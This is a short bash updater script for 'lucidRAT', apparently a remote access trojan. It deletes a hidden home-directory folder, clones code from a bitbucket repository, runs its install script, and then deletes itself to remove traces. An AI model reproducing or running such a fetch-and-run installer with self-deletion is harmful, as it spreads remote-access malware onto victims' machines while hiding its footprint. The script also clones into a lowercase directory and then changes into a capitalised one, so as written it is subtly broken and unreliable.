#!/bin/bash
# updater for lucidRAT
# created by : Lucidif3r

# remove previous version
cd ~
rm -rf .LucidRAT

# install new version
git clone https://Lucidif3r@bitbucket.org/lucidif3r/lucidrat.git

# install dependencies
cd LucidRAT
chmod +x install.sh
./install.sh

# self delete
rm -rf ../update.sh
